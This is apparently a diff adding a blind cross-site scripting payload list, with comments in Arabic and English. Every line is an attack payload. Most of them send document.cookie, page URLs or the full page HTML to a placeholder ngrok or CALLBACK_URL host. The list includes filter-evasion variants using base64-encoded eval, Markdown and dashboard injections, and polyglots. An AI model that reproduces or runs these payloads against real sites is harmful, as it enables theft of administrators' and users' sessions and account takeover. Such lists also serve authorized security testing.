@@ -1,0 +1,54 @@
+# This list we will using  In  Blind_XSS type ( The section follows the xss)
+
+# 1. حمولة سحب الكوكي والصورة (The Full Capture)
+# (بتسحب الكوكيز وبتاخذ رابط الصفحة اللي فتحها الأدمن)
+"><script src="https://YOUR-NGROK-LINK.com/js"></script>
+
+# 2. حمولة الـ "Image Error" (مخفية تماماً)
+<img src=x onerror="fetch('https://YOUR-NGROK-LINK.com/log?c='+document.cookie+'&u='+location.href)">
+
+# 3. حمولة الـ "SVG" المموهة
+<svg/onload="var i=new Image;i.src='https://YOUR-NGROK-LINK.com/log?'+document.cookie;">
+
+# 4. حمولة الـ "Iframe" (لسحب محتوى الصفحة بالكامل)
+<script>fetch('https://YOUR-NGROK-LINK.com/log?body='+btoa(document.body.innerHTML))</script>
+# --- [ الفئة 1: الوسوم الكلاسيكية ] ---
+<script src="CALLBACK_URL"></script>
+"><script src="CALLBACK_URL"></script>
+'><script src="CALLBACK_URL"></script>
+"><img src=x onerror="fetch('CALLBACK_URL?c='+document.cookie)">
+<svg/onload="fetch('CALLBACK_URL?c='+document.cookie)">
+<iframe src="javascript:alert(1)" onload="fetch('CALLBACK_URL?c='+document.cookie)"></iframe>
+<details open ontoggle="fetch('CALLBACK_URL?c='+document.cookie)">
+<video><source onerror="fetch('CALLBACK_URL?c='+document.cookie)"></video>
+<audio src=x onerror="fetch('CALLBACK_URL?c='+document.cookie)"></audio>
+
+# --- [ الفئة 2: كسر السياق Context Breakers ] ---
+" onclick="fetch('CALLBACK_URL?c='+document.cookie)"
+' onclick="fetch('CALLBACK_URL?c='+document.cookie)"
+";fetch('CALLBACK_URL?c='+document.cookie)//
+';fetch('CALLBACK_URL?c='+document.cookie)//
+"onmouseover="fetch('CALLBACK_URL?c='+document.cookie)"
+'onfocus="fetch('CALLBACK_URL?c='+document.cookie)" autofocus
+`onmouseover="fetch('CALLBACK_URL?c='+document.cookie)"
+
+# --- [ الفئة 3: تجاوز الفلاتر WAF Bypass ] ---
+<svg/onload=eval(atob('ZmV0Y2goJ0NBTExCQUNLX1VSTD9jPScrZG9jdW1lbnQuY29va2llKQ=='))>
+<img src=x onerror="window['f'+'etch']('CALLBACK_URL')">
+<details/open/ontoggle="$.getScript('CALLBACK_URL')">
+<script>import('CALLBACK_URL')</script>
+<object data="javascript:fetch('CALLBACK_URL')">
+<isindex type=image src=1 onerror="fetch('CALLBACK_URL')">
+<svg><desc><![CDATA[</desc><script>fetch('CALLBACK_URL')</script>]]></svg>
+<p style="animation-name:xss" onanimationstart="fetch('CALLBACK_URL')"></p>
+
+# --- [ الفئة 4: الحقن داخل Markdown أو لوحات التحكم ] ---
+[clickme](javascript:fetch('CALLBACK_URL'))
+![image](x"onerror="fetch('CALLBACK_URL'))
+<a href="javascript:fetch('CALLBACK_URL')">Click</a>
+<form><button formaction="javascript:fetch('CALLBACK_URL')">X</button></form>
+
+# --- [ الفئة 5: الحمولات المتعددة Polyglots ] ---
+jaVasCript:/*-/*`/*\"/*--></noscript></title></textarea></style></template></link></table><script>fetch('CALLBACK_URL')</script>
+" '><script src="CALLBACK_URL"></script>
+<img src="x:x" onerror="window['atob']('ZmV0Y2goJ0NBTExCQUNLX1VSTCcp')">
